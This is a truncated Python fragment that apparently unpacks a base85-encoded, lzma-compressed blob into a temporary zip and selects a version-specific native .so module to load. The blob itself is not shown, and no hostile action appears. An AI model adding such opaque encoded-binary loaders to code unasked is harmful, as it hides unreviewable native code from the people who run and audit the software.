def _load():
    _raw=lzma.decompress(base64.b85decode(_D))
    _zp=tempfile.mkstemp(suffix='.zip')[1]
    open(_zp,'wb').write(_raw)
    _z=zipfile.ZipFile(_zp)
    _names=_z.namelist()
    _v='%d%d'%(sys.version_info.major,sys.version_info.minor)
    _want='module_'+_v+'.so'
    if _want in _names:_pick=_want
    elif 'module.so' in _names:_pick='module.so'
    else:
        _avail=[n.replace('module_','').replace('.so','') for n in _names if n.startswith('module_')]
